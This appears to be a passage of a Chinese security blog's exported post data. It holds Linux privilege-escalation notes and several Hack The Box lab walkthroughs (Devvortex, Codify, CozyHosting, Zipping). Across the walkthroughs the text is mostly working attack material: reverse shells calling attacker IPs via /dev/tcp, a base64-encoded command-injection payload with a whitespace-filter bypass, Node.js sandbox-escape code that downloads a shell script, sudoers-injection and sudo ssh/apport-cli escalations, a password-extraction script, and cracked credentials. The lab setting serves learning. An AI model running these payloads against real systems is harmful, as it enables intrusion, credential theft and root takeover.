&quot;&quot; &gt; --checkpoint=1echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot; 等待一分钟后，sudoers就会被追加zixyd用户的权限 123456sudo cat /etc/sudoers#每分钟 都会往/etc/sudoers添加一句zixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALL docker提权在docker中，是允许访问root用户和docker组中的其它用户的，测试如下,(这句话表达的不是很清楚，大概意思就是只要用户在docker组下，就可以未授权访问root用户和docker组中的其他用户) 需要将用户添加到docker组中 1usermod -G docker kali 这里有意思的是，我没有输入这条命令，我在我的kali用户已经是dockr组了(意思就是我没有设置实验环境，我的kali机器已经存在可以提权的点了) 上网找原因：在某些Linux系统中，安装Docker后会自动创建一个名为”docker”的用户组，并将当前用户加入该组，以便用户可以在不使用sudo的情况下运行Docker命令。这通常是Docker安装过程中的默认行为。 1234567┌──(kali㉿kali)-[~/桌面]└─$ groups kalikali : kali adm dialout cdrom floppy sudo audio dip video plugdev users netdev wireshark bluetooth scanner kaboxer docker┌──(kali㉿kali)-[~/桌面]└─$ cat /etc/group | grep &quot;docker&quot; docker:x:993:kali 随后使用docker run来允许alpine镜像，v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。 这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root,可以执行任意命令 12345┌──(kali㉿kali)-[~/桌面]└─$ docker run -v /root:/mnt -it alpine / # cd /mnt/mnt # whoamiroot capability提权capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了能力，即赋予某某账号能力，这个账号有能力了，就可以去做事了。 capability可分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力，每一种能力都代表着一种特权。下面是一些能力参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- CAP_CHOWN:修改文件属主的权限- CAP_DAC_OVERRIDE:忽略文件的DAC访问限制- CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制- CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制- CAP_FSETID:允许设置文件的setuid位- CAP_KILL:允许对不属于自己的进程发送信号- CAP_SETGID:允许改变进程的组ID- CAP_SETUID:允许改变进程的用户ID- CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力- CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志- CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口- CAP_NET_BROADCAST:允许网络广播和多播访问- CAP_NET_ADMIN:允许执行网络管理任务- CAP_NET_RAW:允许使用原始套接字- CAP_IPC_LOCK:允许锁定共享内存片段- CAP_IPC_OWNER:忽略IPC所有权检查- CAP_SYS_MODULE:允许插入和删除内核模块- CAP_SYS_RAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备- CAP_SYS_CHROOT:允许使用chroot()系统调用- CAP_SYS_PTRACE:允许跟踪任何进程- CAP_SYS_PACCT:允许执行进程的BSD式审计- CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等- CAP_SYS_BOOT:允许重新启动系统- CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级- CAP_SYS_RESOURCE:忽略资源限制- CAP_SYS_TIME:允许改变系统时钟- CAP_SYS_TTY_CONFIG:允许配置TTY设备- CAP_MKNOD:允许使用mknod()系统调用- CAP_LEASE:允许修改文件锁的FL_LEASE标志 在设置程序能力时，有三个选项可选： 1，inheritable，简称i，表示是否可继承。 2，permitted，简称p，表示是否允许使用。 3，effective，简称e，表示特权是否有效。 setcap命令用来设置能力，例如setcap cap_setuid+ep /home/demo/python3，就表示home/demo/python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。 capability测试 setcap设置能力，getcat读取能力。 getcap通过r参数来读取指定目录下有能力的程序。 123456789┌──(kali㉿kali)-[/tmp]└─$ echo &quot;capability&quot; &gt; capability ┌──(kali㉿kali)-[/tmp]└─$ sudo setcap cap_setuid+ep /tmp/capability┌──(kali㉿kali)-[/tmp]└─$ getcap -r /tmp 2&gt;/dev/null /tmp/capability cap_setuid=ep 能力滥用导致的提权 例如管理员要为python3程序(其他程序类似)设置超级权限给zixyd用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。 因为root只想给zixyd用户的python3能力，所以这里是将程序复制到了zixyd用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力 1234567891011121314151617181920┌──(zixyd㉿kali)-[~]└─$ cp /usr/bin/python3 .┌──(zixyd㉿kali)-[~]└─$ sudo setcap cap_setuid+ep ./python3┌──(zixyd㉿kali)-[~]└─$ ls -l-rwxr-xr-x 1 root zixyd 6754136 12月 8日 13:19 python3┌──(zixyd㉿kali)-[~]└─$ getcap -r ./ 2&gt;/dev/null./python3 cap_setuid=ep┌──(zixyd㉿kali)-[~]└─$ ./python3 -c &quot;import os; os.setuid(0); os.system('/bin/bash')&quot;┌──(root㉿kali)-[~]└─# whoamiroot","link":"/2023/12/07/Linux%E6%8F%90%E6%9D%83/"},{"title":"Devvortex(HTB)","text":"信息搜集80端口123456789sudo nmap -p- -sT --min-rate 5000 10.10.11.242Nmap scan report for devvortex.htb (10.10.11.242)Host is up (0.36s latency).Not shown: 64138 closed tcp ports (conn-refused), 1395 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 77.24 seconds 访问http://10.10.11.242 得到http://devvortex.htb/,添加到/etc/hosts中 子域名寻找一番过后没有找到利用点，尝试信息搜集 1ffuf -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302 将http://dev.devvortex.htb/添加到hosts文件，信息搜集，得到后台地址，Joomla cms CVE-2023-237521http://dev.devvortex.htb/administrator/ searchsploit Joomla扫出一堆漏洞，最终确定为CVE-2023-23752 1Joomla! v4.2.8 - Unauthenticated information disclosure |php/webapps/51334.py 发现两个用户，得到用户为lewis的密码为P4ntherg0t1n5r3c0n## 123456789101112131415161718192021└─$ ./51334.py http://dev.devvortex.htb Users[649] lewis (lewis) - lewis@devvortex.htb - Super Users[650] logan paul (logan) - logan@devvortex.htb - RegisteredSite infoSite name: DevelopmentEditor: tinymceCaptcha: 0Access: 1Debug status: falseDatabase infoDB type: mysqliDB host: localhostDB user: lewisDB password: P4ntherg0t1n5r3c0n##DB name: joomlaDB prefix: sd4fg_DB encryption 0 www-datawebshell连接ssh失败后，使用账号密码进入后台，发现可以修改‎/templates/cassiopeia/error.php,写入反弹shell，再访问这个文件，即可getwebshell,但是时www-data用户， 123456789101112┌──(kali㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]└─$ nc -lnnp 5555Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 07:17:27 up 58 min, 3 users, load average: 0.00, 0.02, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATlogan pts/1 10.10.14.26 07:06 9:51 0.05s 0.05s -bashlogan pts/2 10.10.14.26 07:10 5:48 0.05s 0.05s -bashlogan pts/3 10.10.14.26 07:15 1:42 0.04s 0.04s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)sh: 0: can't access tty; job control turned off$ whoamiwww-data 数据库登陆数据库，寻找logan用户的密码 1234567891011mysql -h localhost -u lewis -pEnter password: P4ntherg0t1n5r3c0n##mysql&gt; select username,password from sd4fg_users;select username,password from sd4fg_users;+----------+--------------------------------------------------------------+| username | password |+----------+--------------------------------------------------------------+| lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u || logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |+----------+--------------------------------------------------------------+ john爆破密码将logan的密码写入到hash文件，利用john工具爆破，得到密码：tequieromucho 1234567891011┌──(kali㉿kali)-[~/桌面]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statustequieromucho (?) 1g 0:00:00:07 DONE (2023-12-08 15:35) 0.1254g/s 176.1p/s 176.1c/s 176.1C/s lacoste..harryUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. su logan切换到logan是遇到一个问题，需要升级shell才能成功切换用户； 再docker中su username,可能会报must be run from terminal;解决方案：clink me 用的比较多的解决方案： 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; logan登陆成功后sudo -l，发现可以执行/usr/bin/apport-cli 1234567891011logan@devvortex:/$ sudo -lsudo -l[sudo] password for logan: tequieromuchoMatching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli Google一下sudo apport-cli，经过搜集，得到一个CVE-2023-1326 CVE-2023-13261.使用命令生成.crash文件 12345678#第一种sleep 100 &amp;ps aux|grep sleepkill -SEGV &lt;pid&gt;#第二种sleep 100 &amp;killall -SIGSEGV sleep 该文件在/var/crash目录下。 2.使用apport-cli处理该文件，选择V选项，该程序会使用less作为查看报告的方式。 1234sudo apport-cli -c /var/crash/xxx.crash输入：v等一段时间后输入：!/bin/bash即可得到shell 总结nmap发现开放80端口，是一个静态页面，没有找到利用点，接着信息搜集找到一个子域名dev,在这个子域名下找到joomla cms,并且可以发现后台登陆页面，再网上可以找到CVE-2023-23752,或者利用工具searchsploit Joomla得到账号密码，ssh登陆无果之后，用账号密码进入后台发现‎/templates/cassiopeia/error.php可以利用;连接webshell，从数据库中可以发现logan的密码，john爆破密码，登陆logan账号，sudo -l后发现可以sudo apport-cli再次利用CVE-2023-1326提升权限到root","link":"/2023/12/08/Devvortex(HTB)/"},{"title":"Codify(HTB)","text":"信息搜集12345sudo nmap -p- -sT --min-rate 3000 10.10.11.23922/tcp open ssh80/tcp open http3000/tcp open ppp 访问10.10.11.239 codify.htb添加到hosts,发现80端口和3000端口访问页面一样的,还有一个editor路由; 根据index.html，不难看出应该是nodejs的沙箱逃逸 123456789101112Test your Node.js code easily.This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.Try it nowCodify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some limitations. We try our best to reduce these so that we can give you a better experience.So why wait? Start using Codify today and start writing and testing your Node.js code with ease! 访问editor路由;存在运行nodejs代码的功能，猜测存在沙箱逃逸 沙箱逃逸在网上能找到相关poc，但是直接用反弹shell命令一直报错，换一种方式； 1234567┌──(kali㉿kali)-[~/桌面/Codify]└─$ cat shell /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.63/5555 0&gt;&amp;1 ┌──(kali㉿kali)-[~/桌面/Codify]└─$ python3 -m http.server nodejs沙箱逃逸这块确实不太懂，以后应该会出一篇博客；poc参考这篇博客clink me 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync('wget 10.10.14.63:8000/shell').toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync(&quot;/bin/bash -i shell&quot;).toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) 连接到webshell之后，在/var/ww/concat下发现一个db文件，尝试从中得到敏感信息 12345678svc@codify:/var/www/contact$ pwd/var/www/contactsvc@codify:/var/www/contact$ lsindex.jspackage.jsonpackage-lock.jsontemplatestickets.db 在tickets.db数据库中也是成功发现一个账号密码 john爆破密码，在尝试ssh连接。是可以成功连接的 12john hash --wordlist=/usr/share/wordlists/rockyou.txtspongebob1 提权12345678joshua@codify:~$ sudo -l[sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh 查看/opt/scripts/mysql-backup.sh文件，似乎是一个备份数据库的sh 1234567891011121314151617181920212223242526272829#!/bin/bashDB_USER=&quot;root&quot;DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=&quot;/var/backups/mysql&quot;read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)for db in $databases; do /usr/bin/echo &quot;Backing up database: $db&quot; /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;done/usr/bin/echo &quot;All databases backed up successfully!&quot;/usr/bin/echo &quot;Changing the permissions&quot;/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;/usr/bin/echo 'Done!' 重点在这，判断输入的密码是否于root密码相同；==判断没有加引号，所以这里并不是字符串比较，这里允许通配符‘* 的存在的，这里的弱比较‘ == ’可以由此绕过, 123456if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi 直接用python脚本跑出root的密码，这个脚本也是比较容易理解 123456789101112131415import subprocessimport stringdef run_command(command): output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode() return outputdic=string.ascii_letters+string.digitspassword=&quot;&quot;for i in range(100): for i in dic: output= run_command(f'echo &quot;{password}{i}*&quot; | sudo /opt/scripts/mysql-backup.sh') if &quot;Password confirmed&quot; in output: password+=i print(password) break 总结信息搜集到80.3000端口开放，且功能一样；editor路由下存在沙箱逃逸可以实现任意命令执行，反弹shell，得到svc用户，继续搜集在/var/ww/concat/tickets.db文件中可以得到用户名为joshua，用john爆破密码，用ssh连接；发现有(root) /opt/scripts/mysql-backup.sh是一个备份数据库的sh文件，其中存在==判断没加引号，允许通配符‘* 的存在的；写python脚本得到root密码","link":"/2023/12/09/Codify(HTB)/"},{"title":"CozyHosting(HTB)","text":"信息搜集nmap123456sudo nmap -p- -sT --min-rate 3000 10.10.11.230PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234567891011121314151617181920dirsearch -u http://cozyhosting.htb/ [19:30:12] 200 - 0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js [19:30:18] 200 - 634B - /actuator [19:30:18] 200 - 5KB - /actuator/env [19:30:19] 200 - 48B - /actuator/sessions [19:30:19] 200 - 10KB - /actuator/mappings [19:30:19] 200 - 15B - /actuator/health [19:30:19] 200 - 124KB - /actuator/beans [19:30:19] 401 - 97B - /admin [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload.swf [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload_f9.swf [19:30:36] 500 - 73B - /error [19:30:37] 200 - 0B - /examples/jsp/%252e%252e/%252e%252e/manager/html/ [19:30:37] 200 - 0B - /extjs/resources//charts.swf [19:30:39] 200 - 0B - /html/js/misc/swfupload//swfupload.swf [19:30:41] 200 - 12KB - /index [19:30:43] 200 - 4KB - /login [19:30:43] 200 - 0B - /login.wdm%2e [19:30:43] 204 - 0B - /logout 寻找漏洞在dirseach中的/actuator/sessions 发现泄露了用户名和其session 198CE8721F7394050CE8CC45241821BAD &quot;kanderson&quot; 访问admin，用泄露的session尝试登陆，可以成功登陆 123456789GET /admin HTTP/1.1Host: cozyhosting.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeCookie: JSESSIONID=98CE8721F7394050CE8CC45241821BADUpgrade-Insecure-Requests: 1 其中存在一处连接ssh的功能，这里存在rce漏洞 利用漏洞经过测试发现对host和username均做了过滤处理，但是在username处只是不能包含空格，可以使用%0a和%09等URL编码绕过空格过滤。；username这里存在rce，但是不会有回显；但是可以给这条命令加上反引号导致回显(会将uid=1001(app)当作命令执行)，这有点像报错回显的感觉 HTTP 头中的 Location 字段用于指示客户端应该重定向到的 URL。当服务器返回带有 Location 头的响应时，客户端会自动重定向到指定的 URL。这通常用于实现页面重定向或者在需要时将客户端引导到另一个位置。Location 头通常与状态码 3xx（重定向）一起使用，以便告知客户端应该采取重定向操作。 于是构造payload反弹shell。(这后台还必须加一个分号才能反弹成功) 123bash -i&gt;&amp; /dev/tcp/10.10.16.45/5555 0&gt;&amp;1{echo,YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo=}|{base64,-d}|bash;%7Becho%2CYmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash; user-app12app@cozyhosting:/app$ lscloudhosting-0.0.1.jar 将cloudhosting-0.0.1.jar文件下载下来 123456方法一nc -nv 10.10.16.45 8888 &lt; cloudhosting-0.0.1.jarnc -lvvp 8888 &gt; cloudhosting-0.0.1.jar方法二python3 -m http.server 将文件用jd-gui反汇编，可以发现一对账号密码 cat /etc/passwd中确实存在postgres用户;尝试ssh登陆一直失败，尝试登陆数据库 123app:x:1001:1001::/home/app:/bin/shpostgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashjosh:x:1003:1003::/home/josh:/usr/bin/bash psqlnetstat -pantu | grep &quot;5432&quot; netstat -pantu 是一个用于显示系统网络状态的命令。在这个命令中： -p 选项用于显示与进程相关的信息，包括进程 ID 和进程名称。 -a 选项用于显示所有的连接和监听端口。 -n 选项用于显示数字形式的 IP 地址和端口号，而不进行域名解析。 -t 选项用于显示 TCP 连接的信息。 -u 选项用于显示 UDP 连接的信息。 因此，netstat -pantu 命令会显示系统上所有的 TCP 和 UDP 连接，以及与这些连接相关的进程信息。 端口 5432 通常用于 PostgreSQL 数据库管理系统。这个端口是PostgreSQL默认的数据库访问端口，用于客户端应用程序连接到 PostgreSQL 服务器。 PostgreSQL 是一个流行的开源关系型数据库管理系统，常用于各种类型的应用程序和网站。 登陆数据库 123python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;psql -U postgres -h localhostPassword for user postgres: Vg&amp;nvzAQ7XxR 以下是一些常用的 psql 命令： 连接到数据库： 1psql -U username -d dbname -h hostname 列出数据库： 1\\l 连接到数据库： 1\\c dbname 列出表： 1\\dt 显示表结构： 1\\d table_name 退出 psql： 1\\q 在本题中敏感信息存放在cozyhosting库中的users表中 123456789cozyhosting=# select * from users;select * from users; name | password | role -----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi 爆破admin的密码居然是用户josh的密码，这就有点离谱了；这里直接用ssh可以连接 usr-josh12ssh josh@10.10.11.230manchesterunited #输入密码 sudo -l 1234567josh@cozyhosting:~$ sudo -l[sudo] password for josh: Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser josh may run the following commands on localhost: (root) /usr/bin/ssh * (root) /usr/bin/ssh *表示以root身份运行ssh，*表示可以使用任何参数 直接在这个网站寻找sshsudo提权；clink me 最终使用提权命令如下 1sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x 补充这是从cloudhosting-0.0.1.jar的一段代码；这应该就是实现ssh功能,过滤不当产生rce漏洞的地方 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package BOOT-INF.classes.htb.cloudhosting.compliance;import jakarta.servlet.http.HttpServletResponse;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.util.regex.Pattern;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class ComplianceService { private final Pattern HOST_PATTERN = Pattern.compile(&quot;^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\\\.?$&quot;); @RequestMapping(method = {RequestMethod.POST}, path = {&quot;/executessh&quot;}) public void executeOverSsh(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;host&quot;) String host, HttpServletResponse response) throws IOException { StringBuilder rbuilder = new StringBuilder(&quot;/admin?error=&quot;); try { validateHost(host); validateUserName(username); Process process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, String.format(&quot;ssh -o ConnectTimeout=1 %s@%s&quot;, new Object[] { username, host }) }); (new BufferedReader(new InputStreamReader(process.getErrorStream()))).lines() .forEach(line -&gt; { if (!line.startsWith(&quot;Pseudo-terminal&quot;)) rbuilder.append(line); }); } catch (IllegalArgumentException exception) { rbuilder.append(exception.getMessage()); } catch (Exception exception) { rbuilder.append(&quot;ssh: Cannot connect to the host&quot;); } finally { response.sendRedirect(rbuilder.toString()); } } private void validateUserName(String username) { if (username.contains(&quot; &quot;)) throw new IllegalArgumentException(&quot;Username can't contain whitespaces!&quot;); } private void validateHost(String host) { if (!this.HOST_PATTERN.matcher(host).matches()) throw new IllegalArgumentException(&quot;Invalid hostname!&quot;); }} 总结namp搜集开放80端口；dirsearch搜集到/admin路由,/actuator/sessions 路由；/actuator/sessions 路由中泄露了用户kanderson的session，可以用这session登陆到admin;在admin页面处的ssh功能应过滤不当存在rce漏洞，以至于可以反弹shell,得到app用户；又能在app用户中得到cloudhosting-0.0.1.jar,而cloudhosting-0.0.1.jar存在敏感信息；账号：postgres，密码：Vg&amp;nvzAQ7XxR;尝试ssh连接不成功，连接数据库(这里注意是psql，从进程中得到这个信息)；在数据库里能找到用户josh的密码:manchesterunited;ssh连接成功,sudo -l发现可以以root身份运行ssh命令，在网上可以找到对应的提权方法，最终拿到root。","link":"/2023/12/11/CozyHosting(HTB)/"},{"title":"Zipping(HTB)","text":"信息搜集nmap12345sudo nmap -p- -sT -min-rate 3000 10.10.11.229PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234dirsearch -u http://10.10.11.229/ [09:38:37] 301 - 311B - /shop -&gt; http://10.10.11.229/shop/ [09:38:46] 200 - 5KB - /upload.php 文件包含 /shop存在文件包含漏洞(只能包含php)，猜测源码是$page.&quot;php&quot;之类的 任意文件读取 /upload.php存在任意文件读取；上传单个以pdf为后缀压缩的zip文件；可以用软连接读取任意文件； 123456ln -s /etc/passwd pass.pdfls -l pass.pdflrwxrwxrwx 1 kali kali 11 12月13日 09:52 pass.pdf -&gt; /etc/passwdzip --symlinks pass.zip pass.pdf zip命令中的--symlinks选项用于指示zip命令在创建存档时如何处理符号链接。如果使用了–symlinks选项，zip命令将会存储符号链接本身，而不是符号链接所指向的文件。这意味着解压缩存档后，符号链接将会保留其链接关系，而不是被解压成实际的文件。 上传pass.zip文件，用bp抓包就可以读取到/etc/passwd；依次读取shop/index.php,/shop/cat.php等文件 1234567891011#/var/www/html/shop/index.php&lt;?phpsession_start();// Include functions and connect to the database using PDO MySQLinclude 'functions.php';$pdo = pdo_connect_mysql();// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.$page = isset($_GET['page']) &amp;&amp; file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';// Include and show the requested pageinclude $page . '.php';?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#/var/www/html/shop/cat.php&lt;?php// If the user clicked the add to cart button on the product page we can check for the form dataif (isset($_POST['product_id'], $_POST['quantity'])) { // Set the post variables so we easily identify them, also make sure they are integer $product_id = $_POST['product_id']; $quantity = $_POST['quantity']; // Filtering user input for letters or special characters if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); // Check if the product exists (array is not empty) if ($product &amp;&amp; $quantity &gt; 0) { // Product exists in database, now we can create/update the session variable for the cart if (isset($_SESSION['cart']) &amp;&amp; is_array($_SESSION['cart'])) { if (array_key_exists($product_id, $_SESSION['cart'])) { // Product exists in cart so just update the quanity $_SESSION['cart'][$product_id] += $quantity; } else { // Product is not in cart so add it $_SESSION['cart'][$product_id] = $quantity; } } else { // There are no products in cart, this will add the first product to cart $_SESSION['cart'] = array($product_id =&gt; $quantity); } } // Prevent form resubmission... header('location: index.php?page=cart'); exit; }}// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it's a number and check if it's in the cartif (isset($_GET['remove']) &amp;&amp; is_numeric($_GET['remove']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; isset($_SESSION['cart'][$_GET['remove']])) { // Remove the product from the shopping cart unset($_SESSION['cart'][$_GET['remove']]);}// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart pageif (isset($_POST['update']) &amp;&amp; isset($_SESSION['cart'])) { // Loop through the post data so we can update the quantities for every product in cart foreach ($_POST as $k =&gt; $v) { if (strpos($k, 'quantity') !== false &amp;&amp; is_numeric($v)) { $id = str_replace('quantity-', '', $k); $quantity = (int)$v; // Always do checks and validation if (is_numeric($id) &amp;&amp; isset($_SESSION['cart'][$id]) &amp;&amp; $quantity &gt; 0) { // Update new quantity $_SESSION['cart'][$id] = $quantity; } } } // Prevent form resubmission... header('location: index.php?page=cart'); exit;}// Send the user to the place order page if they click the Place Order button, also the cart should not be emptyif (isset($_POST['placeorder']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; !empty($_SESSION['cart'])) { header('Location: index.php?page=placeorder'); exit;}if (isset($_POST['clear'])) { unset($_SESSION['cart']);}// Check the session variable for products in cart$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();$products = array();$subtotal = 0.00;// If there are products in cartif ($products_in_cart) { // There are products in the cart so we need to select those products from the database // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc) $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?')); $stmt = $pdo-&gt;prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')'); // We only need the array keys, not the values, the keys are the id's of the products $stmt-&gt;execute(array_keys($products_in_cart)); // Fetch the products from the database and return the result as an Array $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); // Calculate the subtotal foreach ($products as $product) { $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']]; }}?&gt; 1234567891011121314151617##/var/www/html/shop/products.php&lt;?php// The amounts of products to show on each page$num_products_on_each_page = 4;// The current page - in the URL, will appear as index.php?page=products&amp;p=1, index.php?page=products&amp;p=2, etc...$current_page = isset($_GET['p']) &amp;&amp; is_numeric($_GET['p']) ? (int)$_GET['p'] : 1;// Select products ordered by the date added$stmt = $pdo-&gt;prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?');// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause$stmt-&gt;bindValue(1, ($current_page - 1) * $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;bindValue(2, $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;execute();// Fetch the products from the database and return the result as an Array$products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);// Get the total number of products$total_products = $pdo-&gt;query('SELECT * FROM products')-&gt;rowCount();?&gt; 